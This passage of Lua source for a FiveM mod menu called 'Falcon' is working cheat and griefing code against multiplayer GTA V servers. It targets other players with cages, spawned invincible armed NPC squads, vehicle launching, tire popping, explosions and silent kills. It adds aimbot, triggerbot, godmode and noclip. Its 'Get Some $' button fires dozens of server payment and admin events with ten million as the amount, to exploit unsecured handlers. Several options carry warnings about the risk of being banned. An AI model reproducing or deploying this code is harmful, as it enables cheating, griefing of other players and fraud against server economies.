        elseif selPFuncIndexx == 5 then
            local hamburg = "prop_flag_japan"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 6 then
            local hamburg = "prop_flag_germany"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 7 then
            local hamburg = "prop_flag_ireland"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 8 then
            local hamburg = "prop_flag_russia"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 9 then
            local hamburg = "prop_flag_scotland"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 10 then
            local hamburg = "prop_flag_canada"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 11 then
            local hamburg = "prop_flag_mexico"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        elseif selPFuncIndexx == 12 then
            local hamburg = "prop_flag_us"
            local hamburghash = GetHashKey(hamburg)
            local hamburger = CreateObject(hamburghash, 50, 50, 10, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, 0.5, 0.0, 0.0, 10, true, true, false, true, 1, true)
        end
    elseif Falcon.Button("~r~Smash ~s~player") then
        pC()
        FiveM.Subtitle2("~r~Falcon: ~s~Spawned car above player and smashed him.")    
    elseif Falcon.Button('~r~Cage ~s~Player') then
            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
            roundx = tonumber(string.format('%.2f', x))
            roundy = tonumber(string.format('%.2f', y))
            roundz = tonumber(string.format('%.2f', z))
            local e7 = 'prop_fnclink_05crnr1'
            local e8 = GetHashKey(e7)
            RequestModel(e8)
            while not HasModelLoaded(e8) do
                Citizen.Wait(0)
            end
            local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
            local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
            SetEntityHeading(e9, -90.0)
            SetEntityHeading(ea, 90.0)
            FreezeEntityPosition(e9, true)
            FreezeEntityPosition(ea, true)
        elseif Falcon.Button("~r~Spawn ~s~Swat army with ~y~AK") then
            local bQ = "s_m_y_swat_01"
            local bR = "WEAPON_ASSAULTRIFLE"
            for i = 0, 10 do
                local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                RequestModel(GetHashKey(bQ))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(bQ)) then
                    local ped =
                        CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                        CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                        local ei = PedToNet(ped)
                        NetworkSetNetworkIdDynamic(ei, false)
                        SetNetworkIdCanMigrate(ei, true)
                        SetNetworkIdExistsOnAllMachines(ei, true)
                        Citizen.Wait(50)
                        NetToPed(ei)
                        GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                        SetEntityInvincible(ped, true)
                        SetPedCanSwitchWeapon(ped, true)
                        TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                    elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                        TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                    else
                        Citizen.Wait(0)
                    end
                end
            end
    elseif Falcon.Button("~r~Spawn ~s~Stripper army with ~y~RGQ") then
            local bQ = "csb_stripper_02"
            local bR = "weapon_rpg"
            for i = 0, 10 do
                local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                RequestModel(GetHashKey(bQ))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(bQ)) then
                    local ped =
                        CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                        local ei = PedToNet(ped)
                        NetworkSetNetworkIdDynamic(ei, false)
                        SetNetworkIdCanMigrate(ei, true)
                        SetNetworkIdExistsOnAllMachines(ei, true)
                        Citizen.Wait(50)
                        NetToPed(ei)
                        GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                        SetEntityInvincible(ped, true)
                        SetPedCanSwitchWeapon(ped, true)
                        TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                    elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                        TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                    else
                        Citizen.Wait(0)
                    end
                end
            end
    elseif Falcon.Button("Nearby Peds Attack Player") then
        PedAttack(selectedPlayer, PedAttackType)
    elseif Falcon.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
        currAttackTypeIndex = currentIndex
        selAttackTypeIndex = currentIndex
        PedAttackType = currentIndex
    end) then
     elseif Falcon.Button("Possess Player Vehicle") then
        if Spectating then SpectatePlayer(selectedPlayer) end
        PossessVehicle(selectedPlayer)
    elseif Falcon.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
        Tracking = not Tracking
        TrackedPlayer = selectedPlayer
    elseif Falcon.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
        FlingingPlayer = not FlingingPlayer
        FlingedPlayer = selectedPlayer
    elseif Falcon.Button("Launch Players Vehicle") then
        if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            ShowInfo("~r~Player Not In Vehicle!")		
        else
        
            local wasSpeccing= false
            local tmp = nil
            if Spectating then
                tmp = SpectatedPlayer
                wasSpeccing = true
                Spectating = not Spectating
                SpectatePlayer(tmp)
            end
            
            local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
            RequestControlOnce(veh)
            ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            
            if wasSpeccing then
                Spectating = not Spectating
                SpectatePlayer(tmp)
            end
            
        end
    elseif Falcon.Button("Slam Players Vehicle") then
        if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            ShowInfo("~r~Player Not In Vehicle!")
        else
        
            local wasSpeccing= false
            local tmp = nil
            if Spectating then
                tmp = SpectatedPlayer
                wasSpeccing = true
                Spectating = not Spectating
                SpectatePlayer(tmp)
            end
            
            local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
            RequestControlOnce(veh)
            ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            
            if wasSpeccing then
                Spectating = not Spectating
                SpectatePlayer(tmp)
            end
            
        end
    elseif Falcon.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
            currTireIndex = currentIndex
            selTireIndex = currentIndex
            end) then
            if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                ShowInfo("~r~Player Not In Vehicle!")
            else
            
                local wasSpeccing= false
                local tmp = nil
                if Spectating then
                    tmp = SpectatedPlayer
                    wasSpeccing = true
                    Spectating = not Spectating
                    SpectatePlayer(tmp)
                end
            
                local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
                RequestControlOnce(veh)
                if selTireIndex == 1 then
                    SetVehicleTyreBurst(veh, 0, 1, 1000.0)
                    TriggerServerEvent("SlashTires:TargetClient")
                elseif selTireIndex == 2 then
                    SetVehicleTyreBurst(veh, 1, 1, 1000.0)
                    TriggerServerEvent("SlashTires:TargetClient")
                elseif selTireIndex == 3 then
                    SetVehicleTyreBurst(veh, 4, 1, 1000.0)
                    TriggerServerEvent("SlashTires:TargetClient")
                elseif selTireIndex == 4 then
                    SetVehicleTyreBurst(veh, 5, 1, 1000.0)
                    TriggerServerEvent("SlashTires:TargetClient")
                elseif selTireIndex == 5 then
                    for i=0,7 do
                        SetVehicleTyreBurst(veh, i, 1, 1000.0)
                    end
                end
                
                if wasSpeccing then
                    Spectating = not Spectating
                    SpectatePlayer(tmp)
                end
            
            end
    elseif Falcon.Button("Explode Player") then
        ExplodePlayer(selectedPlayer)
    elseif Falcon.Button("Silent Kill Player") then
        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
        AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
        end

    elseif Falcon.IsMenuOpened('giveweapon') then
    if Falcon.MenuButton("~r~→  ~s~Give ~s~Single Weapon", 'weaponspawnerplayer') then
    elseif Falcon.Button("~g~Give ~s~All Weapons") then
        GiveAllWeapons(selectedPlayer)
        elseif Falcon.Button("~r~Remove ~s~All Weapons") then
        StripPlayer(selectedPlayer)
        end

    elseif Falcon.IsMenuOpened("weaponspawnerplayer") then
        for i = 1, #allweapons do
            if Falcon.Button(allweapons[i]) then
                GiveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(allweapons[i]), 250, false, true)
            end
        end

        elseif Falcon.IsMenuOpened('self') then
            if Falcon.MenuButton("~r~→  ~s~Ped Menu ", 'Models') then
            elseif Falcon.MenuButton("~r~→  ~s~Super ~c~Powers", 'powers') then
            elseif Falcon.Button("~s~Get Some ~g~$") then 
                TriggerServerEvent("scrap:SellVehicle", 10000000)
                TriggerServerEvent('esx_truckerjob:pay', 10000000)
				TriggerServerEvent('vrp_slotmachine:server:2', 10000000)
				TriggerServerEvent("esx_pizza:pay", 10000000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 10000000)
				TriggerServerEvent('lscustoms:payGarage', 10000000)
				TriggerServerEvent('esx_tankerjob:pay', 10000000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 10000000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 10000000)
				TriggerServerEvent('gambling:spend', 10000000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 10000000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 10000000)
				TriggerServerEvent('AdminMenu:giveBank', 10000000)
				TriggerServerEvent('AdminMenu:giveCash', 10000000)
				TriggerServerEvent('esx_slotmachine:sv:2', 10000000)
				TriggerServerEvent('esx_moneywash:deposit', 10000000)
				TriggerServerEvent('esx_moneywash:withdraw', 10000000)
				TriggerServerEvent('esx_moneywash:deposit', 10000000)
			    TriggerServerEvent('mission:completed', 10000000)
				TriggerServerEvent('truckerJob:success',10000000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 10000000)
				TriggerServerEvent("dropOff", 10000000)
				TriggerServerEvent('truckerfuel:success',10000000)
				TriggerServerEvent('delivery:success',10000000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -10000000})
				TriggerServerEvent("esx_brinksjob:pay", 10000000)
				TriggerServerEvent("esx_garbagejob:pay", 10000000)
				TriggerServerEvent("esx_postejob:pay", 10000000)
				TriggerServerEvent('esx_garbage:pay', 10000000)
				TriggerServerEvent("esx_carteirojob:pay", 10000000) 
            elseif Falcon.ComboBox("~s~Health", {"~c~20%", "~c~40%", "~c~60%", "~c~80%", "~c~100%"}, currPFuncIndexx, selPFuncIndexx, function(currentIndex, selClothingIndexx) 
                currPFuncIndexx = currentIndex 
                selPFuncIndexx = currentIndex 
            end) then 
                if selPFuncIndexx == 1 then
                    SetEntityHealth(PlayerPedId(), 120) 
                elseif selPFuncIndexx == 2 then 
                    SetEntityHealth(PlayerPedId(), 140)
                elseif selPFuncIndexx == 3 then 
                    SetEntityHealth(PlayerPedId(), 160)
                elseif selPFuncIndexx == 4 then 
                    SetEntityHealth(PlayerPedId(), 180)
                elseif selPFuncIndexx == 5 then 
                    SetEntityHealth(PlayerPedId(), 200) 
                end 
            elseif Falcon.CheckBox("~g~God~s~mode", Godmode) then 
                Godmode = not Godmode 
                ToggleGodmode(Godmode)
            elseif Falcon.CheckBox("Demigod Mode", Demigod) then 
                Demigod = not Demigod 
            elseif Falcon.Button("~g~ESX ~s~Revive ~r~(RISK)") then 
                local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N") 
                if string.lower(confirm) == "y" then 
                    TriggerEvent("esx_status:set", "hunger", 1000000) 
                    TriggerEvent("esx_status:set", "thirst", 1000000) 
                    TriggerEvent("esx_ambulancejob:revive") 
                    TriggerEvent('ambulancier:selfRespawn') 
                else 
                    ShowInfo("~r~Operation Canceled") 
                end 
            elseif Falcon.ComboBox("~b~Player ~s~Functions ~y~»", {"~b~VRP ~s~Revive 💖", "~b~Give ~s~Player Armor", "~y~Remove ~s~Player Armor", "~g~Clean Player", "~y~Suicide 💀", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex) 
                currPFuncIndex = currentIndex 
                selPFuncIndex = currentIndex 
            end) then 
                if selPFuncIndex == 1 then SetEntityHealth(PlayerPedId(), 200) 
                    FiveM.Subtitle("~r~Your HP is now 200") 
                elseif selPFuncIndex == 2 then 
                    SetPedArmour(PlayerPedId(), 100) 
                elseif selPFuncIndex == 3 then 
                    SetPedArmour(PlayerPedId(), 0) 
                elseif selPFuncIndex == 4 then 
                    ClearPedBloodDamage(PlayerPedId()) 
                    ClearPedWetness(PlayerPedId()) 
                    ClearPedEnvDirt(PlayerPedId()) 
                    ResetPedVisibleDamage(PlayerPedId()) 
                elseif selPFuncIndex == 5 then 
                    SetEntityHealth(PlayerPedId(), 0) 
                elseif selPFuncIndex == 6 then 
                    ClearPedTasksImmediately(PlayerPedId()) 
                end 
            elseif Falcon.CheckBox("Infinite Stamina", InfStamina) then 
                InfStamina = not InfStamina 
            elseif Falcon.CheckBox("Alternative Demigod Mode", ADemigod) then 
                ADemigod = not ADemigo 
            elseif Falcon.ComboBoxSlider("Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex) 
                currFastRunIndex = currentIndex 
                selFastRunIndex = currentIndex 
                FastRunMultiplier = FastCB[currentIndex] 
                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier) end) then 
                elseif Falcon.ComboBoxSlider("Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex) 
                    currFastSwimIndex = currentIndex 
                    selFastSwimIndex = currentIndex FastSwimMultiplier = FastCB[currentIndex] 
                    SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier) end) then 
                    elseif Falcon.CheckBox("Super Jump", SuperJump) then 
                        SuperJump = not SuperJump 
                    elseif Falcon.CheckBox("Invisibility", Invisibility) then 
                        Invisibility = not Invisibility if not Invisibility then 
                            SetEntityVisible(PlayerPedId(), true) 
                        end 
                    elseif Falcon.CheckBox("~m~Magneto Mode ~s~KEY ~y~[E]", ForceTog) then 
                        ForceMod() 
                    elseif Falcon.CheckBox("~m~Forcefield", Forcefield) then 
                        Forcefield = not Forcefield 
                    elseif Falcon.ComboBox("~c~Forcefield Radius ~y~»", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex) 
                        currForcefieldRadiusIndex = currentIndex 
                        selForcefieldRadiusIndex = currentIndex 
                        ForcefieldRadius = ForcefieldRadiusOps[currentIndex] end) then 
                        elseif Falcon.CheckBox("~m~Noclip", Noclipping) then 
                            ToggleNoclip() 
                        elseif Falcon.ComboBox("~c~Noclip Speed ~y~»", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex) 
                            currNoclipSpeedIndex = currentIndex 
                            selNoclipSpeedIndex = 
                            currentIndex NoclipSpeed = 
                            NoclipSpeedOps[currNoclipSpeedIndex] end) then 
                            end
            
        
        

        elseif Falcon.IsMenuOpened('appearance') then
            if Falcon.Button("Set Model") then
                local model = GetKeyboardInput("Enter Model Name:")
                RequestModel(GetHashKey(model))
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                else ShowInfo("~r~Model not recognized (Try Again)") end
            elseif Falcon.MenuButton("Modify Skin Textures", 'modifyskintextures') then
            elseif Falcon.Button("Randomize Clothing") then
                RandomClothes(PlayerId())
            elseif Falcon.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
            elseif Falcon.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                SetCurrentOutfit(Outfits[selClothingIndex])
            end


            Falcon.Display()
        elseif Falcon.IsMenuOpened("Models") then
        if Falcon.ComboBox("~r~Gta Online ~s~Models", {"Change to ~b~Trevor", "Change to ~p~Michael", "Change to ~g~Franklin", "Change to ~c~Benny"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
            currVFuncIndex = currentIndex
            selVFuncIndex = currentIndex
            end) then
            if selVFuncIndex == 1 then
				local model = "player_two"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    FiveM.Subtitle("~r~Changed model to Trevor")
				end	
            elseif selVFuncIndex == 2 then
				local model = "player_zero"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    FiveM.Subtitle("~r~Changed model to Michael")
				end	
            elseif selVFuncIndex == 3 then
				local model = "player_one"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                    FiveM.Subtitle("~r~Changed model to Franklin")
                end
                elseif selVFuncIndex == 4 then
                    local model = "ig_benny"
                    RequestModel(GetHashKey(model)) 
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                        FiveM.Subtitle("~r~Changed model to Benny")
                    end
                end
            elseif Falcon.ComboBox("~r~Animals ~s~(RISK)", {"Change to ~r~Monkey", "Change to ~y~Cat", "Change to ~b~Cow", "Change to ~r~husky"}, currVFuncIndexxx, selVFuncIndexxx, function(currentIndexxx, selClothingIndexxx)
                currVFuncIndexxx = currentIndexxx
                selVFuncIndexxx = currentIndexxx
                end) then
                    currVFuncIndexxx = currentIndexxx
                    selVFuncIndexxx = currentIndexxx
                if selVFuncIndex == 1 then
                    local model = "a_c_chimp"
                    RequestModel(GetHashKey(model)) 
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                        FiveM.Subtitle("~r~Changed model to Monkey")
                    end
                elseif selVFuncIndex == 2 then
                    local model = "a_c_cat_01"
                    RequestModel(GetHashKey(model)) 
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                        FiveM.Subtitle("~r~Changed model to Cat")
                    end
                elseif selVFuncIndex == 3 then
                    local model = "a_c_cow"
                    RequestModel(GetHashKey(model)) 
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                        FiveM.Subtitle("~r~Changed model to Cow")
                        end
                    elseif selVFuncIndex == 4 then
                        local model = "a_c_husky"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            FiveM.Subtitle("~r~Changed model to Husky")
                        end
                    end
            elseif Falcon.Button("Change skin(~g~ESX~s~)") then
				TriggerEvent('esx_clotheshop:hasEnteredMarker', currentZone)
				setMenuVisible(currentMenu, false)
			elseif Falcon.Button("Stop Change skin(~g~ESX~s~)") then
				TriggerEvent('esx_clotheshop:hasExitedMarker', lastZone)
			elseif Falcon.Button("~r~Ra~g~nd~b~omi~p~ze ~s~skin textures") then
				SetPedRandomComponentVariation(PlayerPedId(), true)

            elseif Falcon.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
                TriggerEvent('esx_skin:openSaveableMenu')
                end
                

                elseif Falcon.IsMenuOpened('modifyhead') then
                    if Falcon.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
                        currFaceIndex = currentIndex
                        selFaceIndex = currentIndex 
                        SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
						faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
						end) then
                    elseif Falcon.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
                        previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        
                        previousHairTextureDisplay = hairTextureList[currHairTextureIndex]

                        currHairIndex = currentIndex
                        selHairIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
                        currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))

                        if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
                            currHairTextureIndex = hairTexturesList[currentHairTexture]
                            selHairTextureIndex = hairTexturesList[currentHairTexture]
                        end

                        end) then
                    elseif Falcon.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
                        currHairTextureIndex = currentIndex
                        selHairTextureIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
                        end) then
                    elseif Falcon.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
                        currMaskIndex = currentIndex
                        selMaskIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
						end) then
                    elseif Falcon.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
                        previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) 


                        previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]


                        currHatIndex = currentIndex
                        selHatIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
                        currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) 
                        hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) 


                        if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then 
                            print('if condition')

                            

                            currHatTextureIndex = hatTexturesList[currentHatTexture]
                            selHatTextureIndex = hatTexturesList[currentHatTexture]
                        end

						end) then	
					elseif Falcon.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
                        currHatTextureIndex = currentIndex
                        selHatTextureIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
						end) then
						
                    end



        elseif Falcon.IsMenuOpened('modifiers') then
            if Falcon.ComboBox("Forcefield Radius", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
                    currForcefieldRadiusIndex = currentIndex
                    selForcefieldRadiusIndex = currentIndex
                    ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
                    end) then
            elseif Falcon.ComboBox("Noclip Speed", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
                    currNoclipSpeedIndex = currentIndex
                    selNoclipSpeedIndex = currentIndex
                    NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
                    end) then
            end
        

        elseif Falcon.IsMenuOpened('weapon') then
            if Falcon.MenuButton("~r~→  ~s~Give Weapon", 'weaponspawner') then
                selectedPlayer = PlayerId()
			elseif Falcon.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
            elseif Falcon.Button("Give All Weapons") then
                GiveAllWeapons(PlayerId())
            elseif Falcon.Button("Strip All Weapons") then
                StripPlayer(PlayerId())
            elseif Falcon.Button("Give Max Ammo") then
                GiveMaxAmmo(PlayerId())
            elseif Falcon.CheckBox("Infinite Ammo", InfAmmo) then
                InfAmmo = not InfAmmo
                SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
            elseif Falcon.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                ExplosiveAmmo = not ExplosiveAmmo
            elseif Falcon.CheckBox("Force Gun", ForceGun) then
                ForceGun = not ForceGun
            elseif Falcon.CheckBox("DeleteGun", DeleteGun) then
                DeleteGun = not DeleteGun
            elseif Falcon.CheckBox("Super Damage", SuperDamage) then
                SuperDamage = not SuperDamage
                if SuperDamage then
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
                else
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                end
            elseif Falcon.CheckBox("Rapid Fire", RapidFire) then
                RapidFire = not RapidFire
            elseif Falcon.CheckBox("Aimbot", Aimbot) then
                Aimbot = not Aimbot
            elseif Falcon.ComboBox("Aimbot Bone Target", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                currAimbotBoneIndex = currentIndex
                selAimbotBoneIndex = currentIndex
                AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
            end) then
                elseif Falcon.CheckBox("Draw Aimbot FOV", DrawFov) then
                DrawFov = not DrawFov
                elseif Falcon.CheckBox("Triggerbot", Triggerbot) then
                    Triggerbot = not Triggerbot
                elseif Falcon.CheckBox("Ragebot", Ragebot) then
                    Ragebot = not Ragebot
                end
        
            elseif Falcon.IsMenuOpened('WeaponCustomization') then
                if Falcon.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                currPFuncIndex = currentIndex
                selPFuncIndex = currentIndex
                  end) then
                if selPFuncIndex == 1 then
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
             
                elseif selPFuncIndex == 2 then
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                
                elseif selPFuncIndex == 3 then
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                
                elseif selPFuncIndex == 4 then
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                
                elseif selPFuncIndex == 5 then
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                
                elseif selPFuncIndex == 6 then
